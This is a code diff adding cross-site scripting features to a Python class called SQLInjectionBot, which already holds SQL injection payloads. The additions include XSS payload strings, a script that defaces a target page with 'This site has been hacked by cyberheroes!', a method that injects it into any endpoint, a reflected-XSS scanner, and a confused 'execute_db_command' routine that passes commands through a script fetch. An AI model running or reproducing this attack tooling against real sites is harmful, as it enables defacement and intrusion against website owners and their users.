@@ -66,6 +66,55 @@ class SQLInjectionBot:
             "' UNION SELECT NULL, table_name FROM information_schema.tables --",
             "' AND SLEEP(5) --"
         ]
+        self.xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg/onload=alert('XSS')>"
+        ]
+        self.xss_change_appearance_payload = '''
+        <script>
+        document.body.style.backgroundColor = 'black';
+        document.body.style.color = 'lime';
+        var h1 = document.createElement('h1');
+        h1.textContent = 'This site has been hacked by cyberheroes!';
+        document.body.insertBefore(h1, document.body.firstChild);
+        </script>
+        '''
+
+    def change_web_appearance(self, endpoint):
+        print(f"\nAttempting to change web appearance via XSS: {endpoint}\n")
+        try:
+            response = requests.get(endpoint, params={"input": self.xss_change_appearance_payload}, timeout=10)
+            if self.xss_change_appearance_payload in response.text:
+                return "XSS payload for changing appearance was successfully injected"
+            else:
+                return "Failed to inject XSS payload for changing appearance"
+        except requests.exceptions.RequestException as e:
+            return f"Error: {str(e)}"
+
+    def test_xss(self, endpoint):
+        print(f"\nTesting endpoint for XSS: {endpoint}\n")
+        results = []
+        for payload in self.xss_payloads:
+            try:
+                response = requests.get(endpoint, params={"input": payload}, timeout=10)
+                if payload in response.text:
+                    status = "Potential XSS Vulnerability Detected"
+                else:
+                    status = "No XSS Issue"
+                results.append((payload, response.status_code, status))
+            except requests.exceptions.RequestException as e:
+                results.append((payload, "Error", str(e)))
+        return results
+
+    def execute_db_command(self, endpoint, command):
+        print(f"\nAttempting to execute DB command via XSS: {command}\n")
+        payload = f"<script>fetch('{endpoint}?cmd={command}').then(r=>r.text()).then(console.log)</script>"
+        try:
+            response = requests.get(endpoint, params={"input": payload}, timeout=10)
+            return response.text
+        except requests.exceptions.RequestException as e:
+            return f"Error: {str(e)}"
 
     def find_endpoints_and_params(self):
         print("\nFinding endpoints and parameters from the base URL...\n")
